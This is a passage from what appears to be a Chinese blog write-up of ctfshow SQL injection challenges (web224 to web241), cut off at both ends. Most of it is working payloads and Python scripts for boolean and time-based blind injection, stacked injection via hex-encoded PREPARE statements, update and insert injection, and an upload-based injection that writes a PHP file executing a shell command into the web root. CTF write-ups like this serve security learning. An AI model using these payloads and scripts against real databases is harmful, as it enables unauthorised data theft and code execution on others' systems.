</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="s2">&#34;u&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="si">}</span><span class="s2">))&gt;</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span><span class="si">}</span><span class="s2">,username,&#39;a&#39;)&#34;</span> <span class="c1">#布尔盲注</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="c1"># try:</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="c1">#     r = requests.post(url,params=params,timeout=1)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">        <span class="c1">#     tail = mid</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># except Exception as e:</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="c1">#     head = mid + 1</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;userAUTO&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">
</span></span><span class="line"><span class="ln">51</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">        <span class="c1"># 如果找到有效的字符，将其添加到结果字符串中</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">        <span class="c1"># 如果没有找到有效字符，退出循环</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">
</span></span><span class="line"><span class="ln">58</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><p>布尔盲注这么快，我为什么要想不开尝试时间盲注呢</p>
<h4 id="web224">web224<a hidden class="anchor" aria-hidden="true" href="#web224">#</a></h4>
<p><img alt="image-20250216153130500" loading="lazy" src="./assets/image-20250216153130500.png"></p>
<p>试了试万能密码，失败了</p>
<p>访问/robots.txt</p>
<p>发现有重置密码的路由</p>
<p><img alt="image-20250216153239173" loading="lazy" src="./assets/image-20250216153239173.png"></p>
<p>修改密码之后登入，看到一个文件上传</p>
<p><img alt="image-20250216153307127" loading="lazy" src="./assets/image-20250216153307127.png"></p>
<p><a href="https://blog.csdn.net/weixin_48083470/article/details/120608011">ctfshow web224 sql_文件上传产生sql注入 详解_sql注入漏洞ctf文件上传-CSDN博客</a></p>
<p>这是一道文件上传的sql注入题</p>
<p>当文件上传时，后台会将文件名，文件路径，文件类型（文件头）直接与sql语句进行拼接</p>
<p>所以我们可以构造一个恶意文件，将文件头改写成我们要拼接的sql语句，从而实现注入</p>
<p>如图</p>
<p><img alt="在这里插入图片描述" loading="lazy" src="./assets/ddeff9345ea8c8859aab77907198ff9a.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>C64File &#34;&#39;);select 0x3c3f3d60746163202f662a603f3e into outfile &#39;/var/www/html/1.php&#39;;--+
</code></pre><p><img alt="image-20250216153811510" loading="lazy" src="./assets/image-20250216153811510.png"></p>
<p><img alt="image-20250216153856343" loading="lazy" src="./assets/image-20250216153856343.png"></p>
<p>新建文本，写入payload，改名为1.bin，上传文件，访问1.bin拿到flag</p>
<h4 id="堆叠注入">堆叠注入<a hidden class="anchor" aria-hidden="true" href="#堆叠注入">#</a></h4>
<h4 id="web225">web225<a hidden class="anchor" aria-hidden="true" href="#web225">#</a></h4>
<p>没有过滤show</p>
<pre tabindex="0"><code>username=1&#39;;show tables;
</code></pre><p><img alt="image-20250216154601897" loading="lazy" src="./assets/image-20250216154601897.png"></p>
<p>可以用handler读</p>
<p>payload:</p>
<pre tabindex="0"><code>username=ctfshow&#39;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;
</code></pre><p><img alt="image-20250216154743625" loading="lazy" src="./assets/image-20250216154743625.png"></p>
<blockquote>
<p>1.<code>handler ctfshow_flag as a open;</code></p>
<p><code>HANDLER</code> 语句是 MySQL 中用于直接操作表的一种特殊方式。此语句的作用是打开一个名为 <code>ctfshow_flag</code> 的表，并将其别名为 <code>a</code>。<code>HANDLER</code> 语句可以绕过一些常规的查询机制，直接访问表的数据，通常用于高效地获取数据。</p>
<p>2.<code>handler ctfshow_flag as a read first;</code></p>
<p>该语句继续使用 <code>HANDLER</code> 来操作之前打开的 <code>ctfshow_flag</code> 表（别名 <code>a</code>），<code>read first</code> 表示读取表中的第一行数据。</p></blockquote>
<p>其他方法</p>
<p><img alt="image-20250216155035890" loading="lazy" src="./assets/image-20250216155035890.png"></p>
<h4 id="web226">web226<a hidden class="anchor" aria-hidden="true" href="#web226">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//分页查询
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//师傅说过滤的越多越好
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i&#39;</span><span class="p">,</span><span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>这道题把show给waf掉了</p>
<p>这题可以用预处理来打</p>
<p>[<a href="https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%7B%22request%5Fid%22%3A%22160652999219721940215459%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id=160652999219721940215459&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&amp;utm_term=%e5%bc%ba%e7%bd%91%e6%9d%af&amp;spm=1018.2118.3001.4450">SQL注入][强网杯 2019]随便注(三种姿势)-CSDN博客</a></p>
<p>格式</p>
<pre tabindex="0"><code>PREPARE name from &#39;[my sql sequece]&#39;;   //预定义SQL语句
EXECUTE name;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句
</code></pre><p>我们可以先将要执行的语句转换成16进制后，作为预处理的sql语句传入，并执行</p>
<p>payload</p>
<pre tabindex="0"><code>username=1&#39;;PREPARE tables from 0x73686f77207461626c6573;EXECUTE tables;
//show tables

username=1&#39;;PREPARE columns from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d6461746162617365282920616e64207461626c655f6e616d653d2763746673685f6f775f666c6167617327;EXECUTE columns;
//select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;ctfsh_ow_flagas&#39;

username=1&#39;;PREPARE flag from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE flag;
//select flagasb from ctfsh_ow_flagas
//ctfshow{7d0038e7-cede-48cc-b0fb-307177d26890}
</code></pre><h4 id="web227">web227<a hidden class="anchor" aria-hidden="true" href="#web227">#</a></h4>
<p>这道题没办法通过查表拿到flag</p>
<p>这道题的payload是</p>
<pre tabindex="0"><code>1&#39;;call getFlag();
</code></pre><p>就是执行getFlag函数拿到flag</p>
<p>但问题是我们要怎么知道这个函数呢</p>
<p>我们需要查看MySQL的存储过程，如下文</p>
<p><a href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQL——查看存储过程和函数_mysql 查询function-CSDN博客</a></p>
<p><img alt="image-20250216161746894" loading="lazy" src="./assets/image-20250216161746894.png"></p>
<pre tabindex="0"><code>SELECT * FROM information_schema.Routines
</code></pre><p>通过预处理执行</p>
<pre tabindex="0"><code>username=1&#39;;PREPARE Routines from 0x53454c454354202a2046524f4d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;EXECUTE Routines;
</code></pre><p><img alt="image-20250216162150778" loading="lazy" src="./assets/image-20250216162150778.png"></p>
<p>可以看到getFlag函数和flag</p>
<h4 id="web228">web228<a hidden class="anchor" aria-hidden="true" href="#web228">#</a></h4>
<pre tabindex="0"><code>查询语句

  //分页查询
  $sql = &#34;select id,username,pass from ctfshow_user where username = &#39;{$username}&#39;;&#34;;
  $bansql = &#34;select char from banlist;&#34;;
      
返回逻辑

  //师傅说内容太多，就写入数据库保存
  if(count($banlist)&gt;0){
    foreach ($banlist as $char) {
      if(preg_match(&#34;/&#34;.$char.&#34;/i&#34;, $username)){
        die(json_encode($ret));
      }
    }
  }
</code></pre><p>同web226</p>
<h4 id="web229">web229<a hidden class="anchor" aria-hidden="true" href="#web229">#</a></h4>
<p>同web226</p>
<h4 id="web230">web230<a hidden class="anchor" aria-hidden="true" href="#web230">#</a></h4>
<p>同web226</p>
<h4 id="update注入">update注入<a hidden class="anchor" aria-hidden="true" href="#update注入">#</a></h4>
<p><img alt="image-20250217174244222" loading="lazy" src="./assets/image-20250217174244222.png"></p>
<h4 id="web231">web231<a hidden class="anchor" aria-hidden="true" href="#web231">#</a></h4>
<pre tabindex="0"><code>查询语句

  //分页查询
  $sql = &#34;update ctfshow_user set pass = &#39;{$password}&#39; where username = &#39;{$username}&#39;;&#34;;
      
返回逻辑

  //无过滤

      
</code></pre><p>知道update函数的作用之后就好理解了</p>
<p>可以通过update函数更新ctfshow_user表中的内容</p>
<p>利用update将查询结果写入表中</p>
<pre tabindex="0"><code>password=1&#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1
</code></pre><p><img alt="image-20250217180924812" loading="lazy" src="./assets/image-20250217180924812.png"></p>
<pre tabindex="0"><code>查表名
password=1&#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1
查列名
password=1&#39;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#39;flaga&#39;) where 1=1#&amp;username=1
得到flag
password=1&#39;,username=(select flagas from flaga) where 1=1#&amp;username=1
                      
原文链接：https://blog.csdn.net/solitudi/article/details/110144623
</code></pre><h4 id="web232">web232<a hidden class="anchor" aria-hidden="true" href="#web232">#</a></h4>
<pre tabindex="0"><code>查询语句

  //分页查询
  $sql = &#34;update ctfshow_user set pass = md5(&#39;{$password}&#39;) where username = &#39;{$username}&#39;;&#34;;
      
返回逻辑

  //无过滤
</code></pre><p>同web231</p>
<pre tabindex="0"><code>password=1&#39;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1

password=1&#39;),username=(select group_concat(column_name) from information_schema.columns where table_name=&#39;flagaa&#39;) where 1=1#&amp;username=1

password=1&#39;),username=(select flagass from flagaa) where 1=1#&amp;username=1
</code></pre><h4 id="web233">web233<a hidden class="anchor" aria-hidden="true" href="#web233">#</a></h4>
<pre tabindex="0"><code>查询语句

  //分页查询
  $sql = &#34;update ctfshow_user set pass = &#39;{$password}&#39; where username = &#39;{$username}&#39;;&#34;;
      
返回逻辑

  //无过滤
</code></pre><p>这道题貌似waf掉了单引号，导致无法构造闭合，前面的方法用不了</p>
<h5 id="方法一">方法一<a hidden class="anchor" aria-hidden="true" href="#方法一">#</a></h5>
<p>wp看到的骚操作</p>
<p><img alt="image-20250217182218885" loading="lazy" src="./assets/image-20250217182218885.png"></p>
<p>payload</p>
<pre tabindex="0"><code>#获取表名
password=\&amp;username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23

#获取列名
password=\&amp;username=,username=(select group_concat(column_name) from information_schema.columns where table_schema=database())%23

#获取数据
password=\&amp;username=,username=(select group_concat(flagass233) from flag233333)
</code></pre><h5 id="方法二-盲注">方法二 ：盲注<a hidden class="anchor" aria-hidden="true" href="#方法二-盲注">#</a></h5>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="s2">Author:Y4tacker
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://4f5b7639-6d01-45c4-9610-e11239ba8c90.chall.ctf.show/api/?page=1&amp;limit=10&#34;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># 查数据库</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># 查表名</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;flag233333&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="c1"># 查数据</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagass233 from flag233333&#34;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1&#39; or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,sleep(0.05),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;4&#39;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.9</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web234">web234<a hidden class="anchor" aria-hidden="true" href="#web234">#</a></h4>
<pre tabindex="0"><code>查询语句

  //分页查询
  $sql = &#34;update ctfshow_user set pass = &#39;{$password}&#39; where username = &#39;{$username}&#39;;&#34;;
      
返回逻辑

  //无过滤
</code></pre><p>同web233，用\实现逃逸</p>
<h4 id="web235">web235<a hidden class="anchor" aria-hidden="true" href="#web235">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//分页查询
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;update ctfshow_user set pass = &#39;</span><span class="si">{</span><span class="nv">$password</span><span class="si">}</span><span class="s2">&#39; where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//过滤 or &#39; 
</span></span></span></code></pre></div><p><strong>or &lsquo;</strong> 被禁导致inf<strong>or</strong>mation_schema.tables也被禁了</p>
<p>导致我们没办法查询列</p>
<p>这种情况涉及到一个知识点 ：<a href="https://zhuanlan.zhihu.com/p/98206699">CTF|mysql之无列名注入 - 知乎</a></p>
<blockquote>
<p>在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 <a href="https://zhida.zhihu.com/search?content_id=109954541&amp;content_type=Article&amp;match_order=1&amp;q=INNODB_COLUMNS&amp;zhida_source=entity">INNODB_COLUMNS</a> 中记录着表结构。</p></blockquote>
<p>读表</p>
<pre tabindex="0"><code>username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#&amp;password=\
</code></pre><p>查字段</p>
<pre tabindex="0"><code>username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#&amp;password=\
</code></pre><h4 id="web236">web236<a hidden class="anchor" aria-hidden="true" href="#web236">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//分页查询
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;update ctfshow_user set pass = &#39;</span><span class="si">{</span><span class="nv">$password</span><span class="si">}</span><span class="s2">&#39; where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//过滤 or &#39; flag
</span></span></span></code></pre></div><p>读表</p>
<pre tabindex="0"><code>username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#&amp;password=\

//banlist,ctfshow_user,flaga
</code></pre><p>读字段</p>
<pre tabindex="0"><code>username=,username=(select b from (select 1,2 as b,3 union select * from flaga limit 1,1)a)#&amp;password=\
</code></pre><p>这题新增的flag过滤，但是实际上没有影响，或许是过滤返回的内容？</p>
<h4 id="insert注入">insert注入<a hidden class="anchor" aria-hidden="true" href="#insert注入">#</a></h4>
<h4 id="web237">web237<a hidden class="anchor" aria-hidden="true" href="#web237">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//插入数据
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into ctfshow_user(username,pass) value(&#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;,&#39;</span><span class="si">{</span><span class="nv">$password</span><span class="si">}</span><span class="s2">&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span></code></pre></div><p>insert函数用于插入值</p>
<p>其实跟update注入差不多</p>
<p>payload:</p>
<p>读表名</p>
<pre tabindex="0"><code>password=1&amp;username=1&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()));#
</code></pre><p><img alt="image-20250218102751491" loading="lazy" src="./assets/image-20250218102751491.png"></p>
<p>查列名</p>
<pre tabindex="0"><code>password=1&amp;username=1&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;));#

//id,flagass23s3,info
</code></pre><p>爆字段</p>
<pre tabindex="0"><code>password=1&amp;username=1&#39;,(select flagass23s3 from flag));#
</code></pre><h4 id="web238">web238<a hidden class="anchor" aria-hidden="true" href="#web238">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//插入数据
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into ctfshow_user(username,pass) value(&#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;,&#39;</span><span class="si">{</span><span class="nv">$password</span><span class="si">}</span><span class="s2">&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//过滤空格
</span></span></span></code></pre></div><p>测了一下发现不止是空格，连同一些代替空格的字符也被一同waf了，比如/**/</p>
<p>我们可以考虑<strong>用括号代替空格</strong></p>
<p>payload</p>
<pre tabindex="0"><code>#获取表名
username=1&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))%23&amp;password=1

#获取列名
username=1&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flagb&#39;)))%23&amp;password=1

#获取数据
username=1&#39;,(select(group_concat(flag))from(flagb)))%23&amp;password=1
</code></pre><h4 id="web239">web239<a hidden class="anchor" aria-hidden="true" href="#web239">#</a></h4>
<pre tabindex="0"><code>查询语句

  //插入数据
  $sql = &#34;insert into ctfshow_user(username,pass) value(&#39;{$username}&#39;,&#39;{$password}&#39;);&#34;;
      
返回逻辑

  //过滤空格 or 
</code></pre><p>payload:</p>
<p>读表</p>
<pre tabindex="0"><code>username=1&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&amp;password=1
</code></pre><p>由于*被ban掉了，没办法用之前无列名爆字段的方法</p>
<p>这里猜测列名为flag，直接读</p>
<pre tabindex="0"><code>username=1&#39;,(select(flag)from(flagbb)))#&amp;password=1
</code></pre><h4 id="web240">web240<a hidden class="anchor" aria-hidden="true" href="#web240">#</a></h4>
<pre tabindex="0"><code>Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写
</code></pre><pre tabindex="0"><code>查询语句

  //插入数据
  $sql = &#34;insert into ctfshow_user(username,pass) value(&#39;{$username}&#39;,&#39;{$password}&#39;);&#34;;
      
返回逻辑

  //过滤空格 or sys mysql
</code></pre><p>根据hint可以知道是要爆破表名</p>
<p>拿y4✌的脚本改一下</p>
<pre tabindex="0"><code>&#34;&#34;&#34;
Author:Y4tacker
&#34;&#34;&#34;
import random
import requests

url = &#34;http://0a7a5c02-0a05-4efe-86f5-fcf36464cc74.challenge.ctf.show&#34;
url_insert = url + &#34;/api/insert.php&#34;
url_flag = url + &#34;/api/?page=1&amp;limit=1000&#34;


# 看命函数
def generate_random_str():
    sttr = &#39;ab&#39;
    str_list = [random.choice(sttr) for i in range(5)]
    random_str = &#39;&#39;.join(str_list)
    return random_str


while 1:
    data = {
        &#39;username&#39;: f&#34;1&#39;,(select(flag)from(flag{generate_random_str()})))#&#34;,
        &#39;password&#39;: &#34;&#34;
    }
    r = requests.post(url_insert, data=data)
    r2 = requests.get(url_flag)
    if &#34;ctfshow{&#34; in r2.text:
        for i in r2.json()[&#39;data&#39;]:
            if  &#34;ctfshow{&#34; in i[&#39;pass&#39;]:
                print(i[&#39;pass&#39;])
                break
        break
</code></pre><h4 id="web241">web241<a hidden class="anchor" aria-hidden="true" href="#web241">#</a></h4>
<pre tabindex="0"><code>sql语句

  //删除记录
  $sql = &#34;delete from  ctfshow_user where id = {$id}&#34;;
      
返回逻辑

  //无过滤
</code></pre><p>delete注入，delete函数顾名思义就是从数据库中删除内容</p>
<p>注入点在where后面，可以采用时间盲注或者布尔盲注，但是由于delete会删除数据库中的记录，所以可能会出现记录都删完了但是flag还没注出来的情况</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
